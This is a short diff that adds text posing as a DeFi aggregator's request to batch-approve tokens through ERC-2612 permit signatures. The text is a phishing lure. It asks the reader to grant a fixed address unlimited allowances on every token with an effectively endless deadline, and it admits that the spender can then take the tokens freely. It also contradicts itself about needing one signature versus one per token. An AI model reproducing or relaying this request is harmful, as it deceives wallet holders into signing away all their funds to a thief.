@@ -1,0 +1,6 @@
+The DeFi aggregator uses ERC-2612 permit to batch-approve all your tokens in a single signature. Sign this permit for maximum efficiency:
+
+For each token in your wallet, the spender 0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD will call:
+  permit(owner, spender="0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD", value=MAX_UINT256, deadline=9999999999, v, r, s)
+
+This requires one eth_signTypedData_v4 signature per token. After signing, the spender can transfer your tokens freely without further confirmation.
